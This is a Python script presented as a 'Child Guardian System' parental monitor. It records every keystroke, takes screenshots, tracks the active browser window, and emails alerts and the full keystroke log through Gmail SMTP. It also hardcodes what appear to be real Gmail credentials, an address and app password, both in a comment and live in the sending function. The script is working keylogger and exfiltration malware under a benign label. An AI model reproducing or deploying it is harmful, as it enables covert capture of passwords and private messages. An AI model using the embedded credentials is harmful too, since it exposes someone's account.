import pynput
import smtplib
import datetime
import time
import pyautogui
import pygetwindow as gw
import psutil
from email.mime.text import MIMEText
from email.mime.multipart import MIMEMultipart
from email.mime.application import MIMEApplication

key_log = []
current_word = ""
active_url = ""

# Global variables
parent_email = "parent_email@gmail.com"
alert_criteria = ["adultsite", "darkweb"]
screenshot_interval = 300
url_check_interval = 2
last_screenshot_time = time.time()
last_url_check_time = time.time()
child_email = "child_email@gmail.com"
print("Child Guardian System Started!!")
def on_press(key):
    global current_word, last_screenshot_time, last_url_check_time

    try:
        char = key.char
        current_word += str(char)
    except AttributeError:
        if key == pynput.keyboard.Key.space:
            analyze_and_reset_word()
        elif key == pynput.keyboard.Key.enter:
            analyze_and_reset_word()
        elif key == pynput.keyboard.Key.backspace:
            if len(current_word) > 0:
                current_word = current_word[:-1]
        else:
            current_word += str(key)

    key_log.append((datetime.datetime.now(), str(key)))

    # Check if it's time to take a screenshot based on the interval
    if time.time() - last_screenshot_time >= screenshot_interval:
        take_screenshot()
        last_screenshot_time = time.time()

    # Check if it's time to check the active URL based on the interval
    if time.time() - last_url_check_time >= url_check_interval:
        get_active_url()
        last_url_check_time = time.time()

def analyze_and_reset_word():
    global current_word

    if current_word.strip():
        check_alert_criteria(current_word)
    current_word = ""

def check_alert_criteria(word):
    for criterion in alert_criteria:
        if criterion.lower() in word.lower():
            send_alert_email(f"ALERT: Detected '{criterion}' in child's activity!")

def send_alert_email(alert_message):
    try:
        # email = "myfakeaccoun625262@gmail.com"
        # password = "yxyk pctc hrjo otaz"
        email = " email@gmail.com"
        password = "password"

        subject = "Child Guardian Alert"
        timestamp = datetime.datetime.now().strftime('%Y-%m-%d %H:%M:%S')

        msg = MIMEMultipart()
        msg['From'] = email
        msg['To'] = parent_email
        msg['Subject'] = subject

        body_text = f"{alert_message} in time: {timestamp}!\n Active Platform: {active_url}"
        body = MIMEText(body_text)
        msg.attach(body)

        screenshot_path = take_screenshot()
        with open(screenshot_path, "rb") as f:
            attachment = MIMEApplication(f.read(), _subtype="png")
            attachment.add_header('content-disposition', 'attachment', filename="screenshot.png")
            msg.attach(attachment)

        mail = smtplib.SMTP('smtp.gmail.com', 587)
        mail.ehlo()
        mail.starttls()
        mail.login(email, password)
        mail.sendmail(email, parent_email, msg.as_string())
        print("*ALERT SENT*")
        mail.close()

        key_log.clear()

    except Exception as e:
        print(e)

def take_screenshot():
    screenshot_path = f"screenshot_{datetime.datetime.now().strftime('%Y%m%d%H%M%S')}.png"
    pyautogui.screenshot(screenshot_path)
    return screenshot_path

def get_active_url():
    global active_url

    try:
        # First, try to get the URL from the browser process using psutil
        active_url = get_url_from_browser_process()

        # If psutil didn't provide the URL, try using pygetwindow as a fallback
        if not active_url:
            active_window = gw.getActiveWindow()
            current_window_title = active_window.title

            if ' - ' in current_window_title:
                # Extract the part after ' - ' as the potential URL
                potential_url = current_window_title.split(' - ')[-1]

                # Check if the potential URL is a valid URL
                if is_valid_url(potential_url):
                    active_url = potential_url
                    print(f"Active Platform: {active_url}")
                    return

        # If all attempts fail, mark the URL as "Not available"
        active_url = "Not available"

    except Exception as e:
        print(f"Error getting active URL: {e}")
        active_url = "Not available"


def get_url_from_window_title():
    try:
        active_window = gw.get_active_window()
        current_window_title = active_window.title

        if ' - ' in current_window_title:
            potential_url = current_window_title.split(' - ')[-1]

            if is_valid_url(potential_url):
                return potential_url

    except Exception as e:
        print(f"Error getting URL from window title: {e}")

    return None

def get_url_from_browser_process():
    try:
        for process in psutil.process_iter(['pid', 'name']):
            if 'chrome.exe' in process.info['name'].lower():
                return get_chrome_url(process.info['pid'])

    except Exception as e:
        print(f"Error getting URL from browser process: {e}")

    return None

def get_chrome_url(pid):
    try:
        process = psutil.Process(pid)
        cmdline = process.cmdline()
        url = next((arg for arg in cmdline if arg.startswith('http')), None)

        if is_valid_url(url):
            return url

    except Exception as e:
        print(f"Error getting Chrome URL: {e}")

    return None

def is_valid_url(url):
    return url is not None

def on_release(key):
    if key == pynput.keyboard.Key.esc:
        send_email()
        return False

def send_email():
    try:
        email = "myfakeaccoun625262@gmail.com"
        password = "yxyk pctc hrjo otaz"

        send_to_email = child_email
        subject = "Key Log"

        report = generate_report()
        filename = "key_log.txt"
        with open(filename, "w") as f:
            f.write(report)

        msg = MIMEMultipart()
        msg['From'] = email
        msg['To'] = send_to_email
        msg['Subject'] = subject

        with open(filename, "rb") as f:
            attachment = MIMEApplication(f.read(), _subtype="txt")
            attachment.add_header('content-disposition', 'attachment', filename=filename)
            msg.attach(attachment)

        mail = smtplib.SMTP('smtp.gmail.com', 587)
        mail.ehlo()
        mail.starttls()
        mail.login(email, password)
        mail.sendmail(email, send_to_email, msg.as_string())
        print("*DATA SENT*")
        mail.close()

        key_log.clear()

    except Exception as e:
        print(e)

def generate_report():
    report = ""
    for timestamp, key in key_log:
        report += f"{timestamp.strftime('%Y-%m-%d %H:%M:%S')}: {key}\n"

    report += f"\nActive URL: {active_url}\n"
    return report

with pynput.keyboard.Listener(on_press=on_press, on_release=on_release) as listener:
    listener.join()
